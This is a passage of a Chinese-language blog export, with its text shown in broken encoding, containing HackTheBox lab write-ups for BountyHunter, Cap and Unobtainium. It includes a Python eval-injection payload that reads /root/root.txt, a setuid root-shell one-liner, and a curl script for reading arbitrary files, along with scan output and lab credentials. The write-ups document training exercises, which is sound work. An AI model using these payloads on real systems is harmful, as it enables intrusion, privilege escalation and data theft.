x.replace(&quot;**&quot;, &quot;&quot;).split(&quot;+&quot;)[0] # Remove ** from Code Line, and split at pos 0 where + is found. example is: **102+, would become just 102 if int(ticketCode) % 7 == 4: # the tricky part! validationNumber = eval(x.replace(&quot;**&quot;, &quot;&quot;)) # this is confusing! that is the catch, the code does not eval the splitted ticketCode, but actually the line itself just without any **. so you should just pass a line of code that would work. é‚£å’±ä»¬ç¼–å†™ä¸€ä¸ª.mdæ–‡ä»¶è®©ä»–æ»¡è¶³æ¡ä»¶å³å¯ # Skytrain Inc ## Ticket to __Ticket Code:__ **102+ 10 == 112 and __import__(&#39;os&#39;).system(&#39;cat /root/root.txt&#39;) == False å’±ä»¬è¿è¡Œä¸€ä¸‹ development@bountyhunter:~$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py Please enter the path to the ticket file. lucifiel.md Destination: b320161d15bd03095cb66d05ac6d4ddf Invalid ticket. æˆåŠŸè·å¾—rootæƒé™çš„flagæ–‡ä»¶","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Cap - Hackthebox","slug":"Hackthebox - Cap","date":"2021-07-17T11:38:36.000Z","updated":"2023-05-20T01:28:10.000Z","comments":true,"path":"2021/07/17/Hackthebox - Cap/","link":"","permalink":"http://www.lucifiel.com/2021/07/17/Hackthebox%20-%20Cap/","excerpt":"","text":"Hackthebox - CapHackTheBoxåœ¨å‡Œæ™¨ä¸‰ç‚¹å‘å¸ƒäº†ä¸€ä¸ªæ–°çš„é¶åœºï¼Œåœ¨æ¼«é•¿çš„ç­‰å¾…ä¹‹åï¼Œé¶æœºä¸Šçº¿äº†ï¼Œç¬¬ä¸€æ—¶é—´è®¿é—®ï¼Œå¼€å¹² è¿æ¥vpnä¹‹åæ‰“å¼€ç«™ç‚¹ ä¸€åº¦ä»¥ä¸ºå¤åˆ¶é”™äº†ipã€‚ã€‚ã€‚ã€‚ã€‚ã€‚æŸ¥çœ‹ä¿¡æ¯ä¹‹åå‘ç°Security Snapshot(5 Second PCAP + Analysis) ä¸ºæ•°æ®åŒ…å¯ä¸‹è½½ æœæ–­ä¸‹è½½ä¹‹åç”¨wiresharkæ‰“å¼€ ï¼Ÿï¼Ÿï¼Ÿç©ºç™½ï¼Œè¿™æ€•æ˜¯ä¸‹è½½äº†ä¸ªå‡çš„ï¼Œå’Œæœ‹å‹ç¡®è®¤åå‘ç°æ˜¯å› ä¸ºè¿˜æ²¡æœ‰äº§ç”Ÿæ•°æ®åŒ…ï¼Œåˆ·æ–°ä¹‹å å“¦å¼ï¼Œäº§ç”Ÿäº†æ•°æ®åŒ…ï¼Œä¸‹è½½æ‰“å¼€ æ•°æ®åŒ…æ²¡å‘ç°æœ‰ç”¨çš„ä¿¡æ¯ï¼Œä½†ä¸‹è½½çš„æ•°æ®åŒ…å‘½åå’Œç½‘å€åç¼€çš„æ•°å­—ç›¸åŒå¼•èµ·äº†æ³¨æ„ï¼Œ æ—¢ç„¶ç›¸åŒä¸”åˆ·æ–°ä¹‹åå›ç”Ÿæˆæ–°çš„ï¼Œé‚£ä¹ˆä¾¿å¯ä»¥å°è¯•ä¿®æ”¹ï¼Œæœæ–­æ”¹æˆ0ï¼Œ æœç„¶ï¼Œæœ‰äº†ä¿¡æ¯ï¼Œä¸‹è½½ä¹‹åå†æ¬¡ç”¨wiresharkæ‰“å¼€ è¿™ä¸å°±æœ‰äº†å—ï¼ŒæŸ¥çœ‹æ•°æ®åŒ…ï¼ŒæˆåŠŸæ‰¾åˆ°è´¦å·å¯†ç  ç”±äºæ•°æ®åŒ…æ˜¯ftpçš„ï¼Œç›´æ¥å°è¯•ç™»å½•ftp æˆåŠŸç™»å½•ftpï¼Œæ‹¿åˆ°æ™®é€šç”¨æˆ·flagã€‚æ‰«æç«¯å£å¾—çŸ¥å¼€å¯21ã€22ã€80ç«¯å£ å°è¯•ç”¨è¯¥è´¦å·å¯†ç ç™»å½•ssh æˆåŠŸæ‹¿åˆ°æ™®é€šç”¨æˆ·æƒé™ï¼Œå¼€å§‹ææƒæ‹¿åˆ°rootæƒé™ï¼Œsudo â€“l è¯¥ç”¨æˆ·ä¸èƒ½åœ¨è¿™å°é¶æœºä¸Šsudoï¼Œè„‘é˜”ç–¼ï¼Œæ¥ç€æ‰¾å…¶ä»–ä¿¡æ¯ï¼Œåœ¨å°è¯•è¿‡suidææƒï¼Œæœ¬åœ°ææƒï¼Œå†…æ ¸ææƒå‡æ— æœåï¼ŒæŠ½äº†æ ¹çƒŸï¼Œæ‰¾ä¸€äº›ææƒç›¸å…³çš„æ–‡ç«  ç¬¬äºŒå¤©åœ¨æœ‹å‹çš„å¸®åŠ©ä¸‹åˆ©ç”¨python3ææƒï¼Œä½¿ç”¨python3 -c â€˜import os; os.setuid(0); os.system(â€œ&#x2F;bin&#x2F;shâ€)â€™å‘½ä»¤ å¯ä»¥çœ‹åˆ°å·²ç»è·å¾—åˆ°rootæƒé™ï¼Œfindæœç´¢ä¸€ä¸‹å­˜åœ¨çš„å…³äºrootçš„ç›®å½•ï¼Œçœ‹åˆ°&#x2F;root è¿›åˆ°rootç›®å½•çœ‹åˆ°root.txtï¼Œæ‹¿åˆ°rootæƒé™çš„flag æäº¤ï¼Œå®Œæ´» æ³¨æ„ï¼š 1ã€å…³æ³¨urlçš„å˜åŒ–ï¼Œé‡Œé¢å¯èƒ½å­˜åœ¨æŸäº›ä¿¡æ¯ 2ã€åˆ†ææµé‡åŒ…ï¼Œæ‰¾å¯»å…³é”®ä¿¡æ¯ 3ã€æ€ç»´æ‰©æ•£ï¼Œæ‰¾å¯»å¯èƒ½å­˜åœ¨å¯åˆ©ç”¨çš„ç‚¹","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Unobtainium - Hackthebox","slug":"Hackthebox - Unobtanium","date":"2021-07-17T11:38:36.000Z","updated":"2023-05-20T03:24:21.000Z","comments":true,"path":"2021/07/17/Hackthebox - Unobtanium/","link":"","permalink":"http://www.lucifiel.com/2021/07/17/Hackthebox%20-%20Unobtanium/","excerpt":"","text":"Hackthebox - UnobtainiumHackthebox - Unobtainium é¶åœºå®æˆ˜é¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æœé›† é¦–å…ˆä½¿ç”¨nmapè¿›è¡Œç«¯å£æ‰«æâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# nmap -A -sS -sC -sV -p- 10.10.10.235 Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-15 22:08 CST Nmap scan report for 10.10.10.235 Host is up (0.27s latency). Not shown: 65527 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 e4:bf:68:42:e5:74:4b:06:58:78:bd:ed:1e:6a:df:66 (RSA) | 256 bd:88:a1:d9:19:a0:12:35:ca:d3:fa:63:76:48:dc:65 (ECDSA) |_ 256 cf:c4:19:25:19:fa:6e:2e:b7:a4:aa:7d:c3:f1:3d:9b (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Unobtainium 2379/tcp open ssl/etcd-client? | ssl-cert: Subject: commonName=unobtainium | Subject Alternative Name: DNS:localhost, DNS:unobtainium, IP Address:10.10.10.3, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1 | Not valid before: 2021-01-17T07:10:30 |_Not valid after: 2022-01-17T07:10:30 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ h2 | tls-nextprotoneg: |_ h2 2380/tcp open ssl/etcd-server? | ssl-cert: Subject: commonName=unobtainium | Subject Alternative Name: DNS:localhost, DNS:unobtainium, IP Address:10.10.10.3, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1 | Not valid before: 2021-01-17T07:10:30 |_Not valid after: 2022-01-17T07:10:30 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ h2 | tls-nextprotoneg: |_ h2 8443/tcp open ssl/https-alt | fingerprint-strings: | FourOhFourRequest: | HTTP/1.0 403 Forbidden | Cache-Control: no-cache, private | Content-Type: application/json | X-Content-Type-Options: nosniff | X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39 | X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd | Date: Thu, 15 Jul 2021 14:50:44 GMT | Content-Length: 212 | {&quot;kind&quot;:&quot;Status&quot;,&quot;apiVersion&quot;:&quot;v1&quot;,&quot;metadata&quot;:{},&quot;status&quot;:&quot;Failure&quot;,&quot;message&quot;:&quot;forbidden: User &quot;system:anonymous&quot; cannot get path &quot;/nice ports,/Trinity.txt.bak&quot;&quot;,&quot;reason&quot;:&quot;Forbidden&quot;,&quot;details&quot;:{},&quot;code&quot;:403} | GenericLines: | HTTP/1.1 400 Bad Request | Content-Type: text/plain; charset=utf-8 | Connection: close | Request | GetRequest: | HTTP/1.0 403 Forbidden | Cache-Control: no-cache, private | Content-Type: application/json | X-Content-Type-Options: nosniff | X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39 | X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd | Date: Thu, 15 Jul 2021 14:50:42 GMT | Content-Length: 185 | {&quot;kind&quot;:&quot;Status&quot;,&quot;apiVersion&quot;:&quot;v1&quot;,&quot;metadata&quot;:{},&quot;status&quot;:&quot;Failure&quot;,&quot;message&quot;:&quot;forbidden: User &quot;system:anonymous&quot; cannot get path &quot;/&quot;&quot;,&quot;reason&quot;:&quot;Forbidden&quot;,&quot;details&quot;:{},&quot;code&quot;:403} | HTTPOptions: | HTTP/1.0 403 Forbidden | Cache-Control: no-cache, private | Content-Type: application/json | X-Content-Type-Options: nosniff | X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39 | X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd | Date: Thu, 15 Jul 2021 14:50:43 GMT | Content-Length: 189 |_ {&quot;kind&quot;:&quot;Status&quot;,&quot;apiVersion&quot;:&quot;v1&quot;,&quot;metadata&quot;:{},&quot;status&quot;:&quot;Failure&quot;,&quot;message&quot;:&quot;forbidden: User &quot;system:anonymous&quot; cannot options path &quot;/&quot;&quot;,&quot;reason&quot;:&quot;Forbidden&quot;,&quot;details&quot;:{},&quot;code&quot;:403} |_http-title: Site doesn&#39;t have a title (application/json). | ssl-cert: Subject: commonName=minikube/organizationName=system:masters | Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.10.235, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1 | Not valid before: 2021-07-14T05:10:38 |_Not valid after: 2022-07-15T05:10:38 |_ssl-date: TLS randomness does not represent time | tls-alpn: | h2 |_ http/1.1 10250/tcp open ssl/http Golang net/http server (Go-IPFS json-rpc or InfluxDB API) |_http-title: Site doesn&#39;t have a title (text/plain; charset=utf-8). | ssl-cert: Subject: commonName=unobtainium@1610865428 | Subject Alternative Name: DNS:unobtainium | Not valid before: 2021-01-17T05:37:08 |_Not valid after: 2022-01-17T05:37:08 |_ssl-date: TLS randomness does not represent time | tls-alpn: | h2 |_ http/1.1 10256/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API) |_http-title: Site doesn&#39;t have a title (text/plain; charset=utf-8). 31337/tcp open http Node.js Express framework | http-methods: |_ Potentially risky methods: PUT DELETE |_http-title: Site doesn&#39;t have a title (application/json; charset=utf-8). 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port8443-TCP:V=7.91%T=SSL%I=7%D=7/15%Time=60F04857%P=x86_64-pc-linux-gn SF:u%r(GetRequest,1FF,&quot;HTTP/1\\.0\\x20403\\x20Forbidden\\r\\nCache-Control:\\x20 SF:no-cache,\\x20private\\r\\nContent-Type:\\x20application/json\\r\\nX-Content- SF:Type-Options:\\x20nosniff\\r\\nX-Kubernetes-Pf-Flowschema-Uid:\\x203082aa7f SF:-e4b1-444a-a726-829587cd9e39\\r\\nX-Kubernetes-Pf-Prioritylevel-Uid:\\x20c SF:4131e14-5fda-4a46-8349-09ccbed9efdd\\r\\nDate:\\x20Thu,\\x2015\\x20Jul\\x2020 SF:21\\x2014:50:42\\x20GMT\\r\\nContent-Length:\\x20185\\r\\n\\r\\n{\\&quot;kind\\&quot;:\\&quot;Stat SF:us\\&quot;,\\&quot;apiVersion\\&quot;:\\&quot;v1\\&quot;,\\&quot;metadata\\&quot;:{},\\&quot;status\\&quot;:\\&quot;Failure\\&quot;,\\&quot;mes SF:sage\\&quot;:\\&quot;forbidden:\\x20User\\x20\\\\\\&quot;system:anonymous\\\\\\&quot;\\x20cannot\\x20ge SF:t\\x20path\\x20\\\\\\&quot;/\\\\\\&quot;\\&quot;,\\&quot;reason\\&quot;:\\&quot;Forbidden\\&quot;,\\&quot;details\\&quot;:{},\\&quot;code SF:\\&quot;:403}\\n&quot;)%r(HTTPOptions,203,&quot;HTTP/1\\.0\\x20403\\x20Forbidden\\r\\nCache-C SF:ontrol:\\x20no-cache,\\x20private\\r\\nContent-Type:\\x20application/json\\r\\ SF:nX-Content-Type-Options:\\x20nosniff\\r\\nX-Kubernetes-Pf-Flowschema-Uid:\\ SF:x203082aa7f-e4b1-444a-a726-829587cd9e39\\r\\nX-Kubernetes-Pf-Priorityleve SF:l-Uid:\\x20c4131e14-5fda-4a46-8349-09ccbed9efdd\\r\\nDate:\\x20Thu,\\x2015\\x SF:20Jul\\x202021\\x2014:50:43\\x20GMT\\r\\nContent-Length:\\x20189\\r\\n\\r\\n{\\&quot;ki SF:nd\\&quot;:\\&quot;Status\\&quot;,\\&quot;apiVersion\\&quot;:\\&quot;v1\\&quot;,\\&quot;metadata\\&quot;:{},\\&quot;status\\&quot;:\\&quot;Fail SF:ure\\&quot;,\\&quot;message\\&quot;:\\&quot;forbidden:\\x20User\\x20\\\\\\&quot;system:anonymous\\\\\\&quot;\\x20c SF:annot\\x20options\\x20path\\x20\\\\\\&quot;/\\\\\\&quot;\\&quot;,\\&quot;reason\\&quot;:\\&quot;Forbidden\\&quot;,\\&quot;deta SF:ils\\&quot;:{},\\&quot;code\\&quot;:403}\\n&quot;)%r(FourOhFourRequest,21A,&quot;HTTP/1\\.0\\x20403\\x2 SF:0Forbidden\\r\\nCache-Control:\\x20no-cache,\\x20private\\r\\nContent-Type:\\x SF:20application/json\\r\\nX-Content-Type-Options:\\x20nosniff\\r\\nX-Kubernete SF:s-Pf-Flowschema-Uid:\\x203082aa7f-e4b1-444a-a726-829587cd9e39\\r\\nX-Kuber SF:netes-Pf-Prioritylevel-Uid:\\x20c4131e14-5fda-4a46-8349-09ccbed9efdd\\r\\n SF:Date:\\x20Thu,\\x2015\\x20Jul\\x202021\\x2014:50:44\\x20GMT\\r\\nContent-Length SF::\\x20212\\r\\n\\r\\n{\\&quot;kind\\&quot;:\\&quot;Status\\&quot;,\\&quot;apiVersion\\&quot;:\\&quot;v1\\&quot;,\\&quot;metadata\\&quot; SF::{},\\&quot;status\\&quot;:\\&quot;Failure\\&quot;,\\&quot;message\\&quot;:\\&quot;forbidden:\\x20User\\x20\\\\\\&quot;syst SF:em:anonymous\\\\\\&quot;\\x20cannot\\x20get\\x20path\\x20\\\\\\&quot;/nice\\x20ports,/Trinit SF:y\\.txt\\.bak\\\\\\&quot;\\&quot;,\\&quot;reason\\&quot;:\\&quot;Forbidden\\&quot;,\\&quot;details\\&quot;:{},\\&quot;code\\&quot;:403} SF:\\n&quot;)%r(GenericLines,67,&quot;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-T SF:ype:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400 SF:\\x20Bad\\x20Request&quot;); No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=7/15%OT=22%CT=1%CU=43753%PV=Y%DS=2%DC=T%G=Y%TM=60F048D OS:E%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1 OS:1NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N% OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD OS:=S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 1025/tcp) HOP RTT ADDRESS 1 271.92 ms 10.10.14.1 2 271.99 ms 10.10.10.235 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 1914.83 seconds ä»ä¸Šé¢çš„æ‰«æç»“æœï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°å‡ ä¸ªå…³é”®ä¿¡æ¯ - æœ¬å°é¶æœºå¼€å¯äº†22ï¼Œ80ï¼Œ2379ï¼Œ2380ï¼Œ8443ï¼Œ10250ï¼Œ10256ï¼Œ31337ç«¯å£ - å…¶ä¸­80ï¼Œ2379ï¼Œ2380ï¼Œ8443ï¼Œ10250ï¼Œ10256ï¼Œ31337éƒ½æ˜¯httpæœåŠ¡ - 8443ç«¯å£ç»™å‡ºäº†ä¸¤ä¸ªå…³é”®ä¿¡æ¯ /nice /Trinity.txt.bak - 31337ç«¯å£å­˜åœ¨PUTå’ŒDELETEé£é™© å’±ä»¬å…ˆå»80ç«¯å£çœ‹çœ‹ http://10.10.10.235/ å®ƒå£°ç§°è¿™æ˜¯ä¸€ä¸ªèŠå¤©ç¨‹åºï¼Œå¹¶ç»™äº†ä¸‰ä¸ªä¸‹è½½åœ°å€ï¼Œå’±ä»¬ç»™å®ƒä¸‹è½½ä¸‹æ¥ï¼ŒåŒæ—¶FUZZä¸€ä¸‹ç›®å½• â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# gobuster dir -u http://10.10.10.235 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt -t 200 =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.235 [+] Method: GET [+] Threads: 200 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/common.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Extensions: txt,php,html [+] Timeout: 10s =============================================================== 2021/07/16 16:33:21 Starting gobuster in directory enumeration mode =============================================================== /.htpasswd.php (Status: 403) [Size: 277] /.hta (Status: 403) [Size: 277] /.htaccess (Status: 403) [Size: 277] /.htpasswd.html (Status: 403) [Size: 277] /.hta.txt (Status: 403) [Size: 277] /.htaccess.php (Status: 403) [Size: 277] /.htpasswd.txt (Status: 403) [Size: 277] /.hta.php (Status: 403) [Size: 277] /.htaccess.html (Status: 403) [Size: 277] /.htaccess.txt (Status: 403) [Size: 277] /.htpasswd (Status: 403) [Size: 277] /.hta.html (Status: 403) [Size: 277] /LICENSE.txt (Status: 200) [Size: 17128] /README.txt (Status: 200) [Size: 711] /assets (Status: 301) [Size: 313] [--&gt; http://10.10.10.235/assets/] /downloads (Status: 301) [Size: 316] [--&gt; http://10.10.10.235/downloads/] /index.html (Status: 200) [Size: 1988] /index.html (Status: 200) [Size: 1988] /images (Status: 301) [Size: 313] [--&gt; http://10.10.10.235/images/] /server-status (Status: 403) [Size: 277] =============================================================== 2021/07/16 16:33:58 Finished =============================================================== å½“fuzzå®Œçš„æ—¶å€™ï¼Œä¸‰ä¸ªæ–‡ä»¶ä¹Ÿä¸‹è½½å®Œäº†ï¼Œå’±ä»¬å»çœ‹ä¸€ä¸‹ â”Œâ”€â”€(rootğŸ’€root)-[~/Downloads] â””â”€# ls unobtainium_debian.zip unobtainium_redhat.zip unobtainium_snap.zip è®©æˆ‘ä»¬æå–debåŒ…ä¸­çš„æ–‡ä»¶ï¼Œè€Œä¸å®‰è£…å®ƒ mkdir test unzip unobtainium_debian.zip dpkg-deb -xv unobtainium_1.0.0_amd64.deb test cd test â”Œâ”€â”€(rootğŸ’€root)-[~/Downloads/test] â””â”€# tree . â”œâ”€â”€ opt â”‚ â””â”€â”€ unobtainium â”‚ â”œâ”€â”€ chrome_100_percent.pak â”‚ â”œâ”€â”€ chrome_200_percent.pak â”‚ â”œâ”€â”€ chrome-sandbox â”‚ â”œâ”€â”€ icudtl.dat â”‚ â”œâ”€â”€ libEGL.so â”‚ â”œâ”€â”€ libffmpeg.so â”‚ â”œâ”€â”€ libGLESv2.so â”‚ â”œâ”€â”€ libvk_swiftshader.so â”‚ â”œâ”€â”€ libvulkan.so â”‚ â”œâ”€â”€ LICENSE.electron.txt â”‚ â”œâ”€â”€ LICENSES.chromium.html â”‚ â”œâ”€â”€ locales â”‚ â”‚ â”œâ”€â”€ am.pak â”‚ â”‚ â”œâ”€â”€ ar.pak â”‚ â”‚ â”œâ”€â”€ bg.pak â”‚ â”‚ â”œâ”€â”€ bn.pak â”‚ â”‚ â”œâ”€â”€ ca.pak â”‚ â”‚ â”œâ”€â”€ cs.pak â”‚ â”‚ â”œâ”€â”€ da.pak â”‚ â”‚ â”œâ”€â”€ de.pak â”‚ â”‚ â”œâ”€â”€ el.pak â”‚ â”‚ â”œâ”€â”€ en-GB.pak â”‚ â”‚ â”œâ”€â”€ en-US.pak â”‚ â”‚ â”œâ”€â”€ es-419.pak â”‚ â”‚ â”œâ”€â”€ es.pak â”‚ â”‚ â”œâ”€â”€ et.pak â”‚ â”‚ â”œâ”€â”€ fa.pak â”‚ â”‚ â”œâ”€â”€ fil.pak â”‚ â”‚ â”œâ”€â”€ fi.pak â”‚ â”‚ â”œâ”€â”€ fr.pak â”‚ â”‚ â”œâ”€â”€ gu.pak â”‚ â”‚ â”œâ”€â”€ he.pak â”‚ â”‚ â”œâ”€â”€ hi.pak â”‚ â”‚ â”œâ”€â”€ hr.pak â”‚ â”‚ â”œâ”€â”€ hu.pak â”‚ â”‚ â”œâ”€â”€ id.pak â”‚ â”‚ â”œâ”€â”€ it.pak â”‚ â”‚ â”œâ”€â”€ ja.pak â”‚ â”‚ â”œâ”€â”€ kn.pak â”‚ â”‚ â”œâ”€â”€ ko.pak â”‚ â”‚ â”œâ”€â”€ lt.pak â”‚ â”‚ â”œâ”€â”€ lv.pak â”‚ â”‚ â”œâ”€â”€ ml.pak â”‚ â”‚ â”œâ”€â”€ mr.pak â”‚ â”‚ â”œâ”€â”€ ms.pak â”‚ â”‚ â”œâ”€â”€ nb.pak â”‚ â”‚ â”œâ”€â”€ nl.pak â”‚ â”‚ â”œâ”€â”€ pl.pak â”‚ â”‚ â”œâ”€â”€ pt-BR.pak â”‚ â”‚ â”œâ”€â”€ pt-PT.pak â”‚ â”‚ â”œâ”€â”€ ro.pak â”‚ â”‚ â”œâ”€â”€ ru.pak â”‚ â”‚ â”œâ”€â”€ sk.pak â”‚ â”‚ â”œâ”€â”€ sl.pak â”‚ â”‚ â”œâ”€â”€ sr.pak â”‚ â”‚ â”œâ”€â”€ sv.pak â”‚ â”‚ â”œâ”€â”€ sw.pak â”‚ â”‚ â”œâ”€â”€ ta.pak â”‚ â”‚ â”œâ”€â”€ te.pak â”‚ â”‚ â”œâ”€â”€ th.pak â”‚ â”‚ â”œâ”€â”€ tr.pak â”‚ â”‚ â”œâ”€â”€ uk.pak â”‚ â”‚ â”œâ”€â”€ vi.pak â”‚ â”‚ â”œâ”€â”€ zh-CN.pak â”‚ â”‚ â””â”€â”€ zh-TW.pak â”‚ â”œâ”€â”€ resources â”‚ â”‚ â””â”€â”€ app.asar â”‚ â”œâ”€â”€ resources.pak â”‚ â”œâ”€â”€ snapshot_blob.bin â”‚ â”œâ”€â”€ swiftshader â”‚ â”‚ â”œâ”€â”€ libEGL.so â”‚ â”‚ â””â”€â”€ libGLESv2.so â”‚ â”œâ”€â”€ unobtainium â”‚ â”œâ”€â”€ v8_context_snapshot.bin â”‚ â””â”€â”€ vk_swiftshader_icd.json â””â”€â”€ usr â””â”€â”€ share â”œâ”€â”€ applications â”‚ â””â”€â”€ unobtainium.desktop â”œâ”€â”€ doc â”‚ â””â”€â”€ unobtainium â”‚ â””â”€â”€ changelog.gz â””â”€â”€ icons â””â”€â”€ hicolor â”œâ”€â”€ 128x128 â”‚ â””â”€â”€ apps â”‚ â””â”€â”€ unobtainium.png â”œâ”€â”€ 16x16 â”‚ â””â”€â”€ apps â”‚ â””â”€â”€ unobtainium.png â”œâ”€â”€ 256x256 â”‚ â””â”€â”€ apps â”‚ â””â”€â”€ unobtainium.png â”œâ”€â”€ 32x32 â”‚ â””â”€â”€ apps â”‚ â””â”€â”€ unobtainium.png â”œâ”€â”€ 48x48 â”‚ â””â”€â”€ apps â”‚ â””â”€â”€ unobtainium.png â””â”€â”€ 64x64 â””â”€â”€ apps â””â”€â”€ unobtainium.png 24 directories, 80 files åœ¨/test/opt/unobtainiumä¸­ï¼Œæœ‰ä¸€ä¸ªåä¸ºunobtainiumçš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œè®©æˆ‘ä»¬æ‰§è¡Œå®ƒ ./unobtainium --no-sandbox å¾—åˆ°äº†é”™è¯¯ è®©æˆ‘ä»¬æ·»åŠ ä¸€ä¸‹åŸŸå echo 10.10.10.235 unobtainium.htb &gt;&gt; /etc/hosts ç„¶åå†æ‰§è¡Œä¸€æ¬¡ è¿™æ¬¡è¿è¡Œæ­£å¸¸äº† å½“æˆ‘ä½¿ç”¨Wiresharkç›‘å¬tun0çš„æ—¶å€™ï¼Œåœ¨Unobtainium Chatä¸­ç‚¹å‡»Todoå³å¯æ•æ‰åˆ°æµé‡åŒ… POST /todo HTTP/1.1 Host: unobtainium.htb:31337 Connection: keep-alive Content-Length: 73 Accept: application/json, text/javascript, */*; q=0.01 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) unobtainium/1.0.0 Chrome/87.0.4280.141 Electron/11.2.0 Safari/537.36 Content-Type: application/json Accept-Encoding: gzip, deflate Accept-Language: zh-CN {&quot;auth&quot;:{&quot;name&quot;:&quot;felamos&quot;,&quot;password&quot;:&quot;Winter2021&quot;},&quot;filename&quot;:&quot;todo.txt&quot;}HTTP/1.1 200 OK X-Powered-By: Express Content-Type: application/json; charset=utf-8 Content-Length: 293 ETag: W/&quot;125-tNs2+nU0UiQGmLreBy4Pj891aVA&quot; Date: Fri, 16 Jul 2021 09:49:16 GMT Connection: keep-alive Keep-Alive: timeout=5 {&quot;ok&quot;:true,&quot;content&quot;:&quot;1. Create administrator zone.\\n2. Update node JS API Server.\\n3. Add Login functionality.\\n4. Complete Get Messages feature.\\n5. Complete ToDo feature.\\n6. Implement Google Cloud Storage function: https://cloud.google.com/storage/docs/json_api/v1\\n7. Improve security\\n&quot;} ä¼¼ä¹Todoå‡½æ•°å…·æœ‰ä»æœåŠ¡å™¨è¯»å–æ–‡ä»¶çš„èƒ½åŠ›ã€‚ æˆ‘æ‰¾åˆ°ä¸€ä¸ªè„šæœ¬æ¥æ£€æŸ¥æ˜¯å¦å¯ä»¥ä»æœåŠ¡å™¨è¯»å–æ–‡ä»¶ã€‚ æˆ‘è¿˜è¿è¡Œäº†Burpæ¥æ•è·è¯·æ±‚ ## æ¼æ´åˆ©ç”¨ åœ¨è¿è¡Œè„šæœ¬ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦å®‰è£…éœ€è¦çš„ç¯å¢ƒ apt-get install jq #!/bin/bash RHOST=&quot;unobtainium.htb&quot; RPORT=31337 UA=&quot;Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0&quot; PROXY=&quot;127.0.0.1:8080&quot; FILE=$1 cat - &lt;&lt;EOF &gt; message.json { &quot;auth&quot;: { &quot;name&quot;:&quot;felamos&quot;, &quot;password&quot;:&quot;Winter2021&quot; }, &quot;filename&quot;:&quot;${FILE}&quot; } EOF CONTENT=&quot;$(curl -s \\ -A &quot;${UA}&quot; \\ -H &quot;Content-Type: application/json&quot; \\ -d &quot;$(cat message.json | jq -c)&quot; \\ -x &quot;${PROXY}&quot; \\ http://${RHOST}:${RPORT}/todo \\ | jq .content \\ | sed -e &#39;s/^.//&#39; -e &#39;s/.$//&#39;)&quot; printf &quot;$CONTENT&quot; 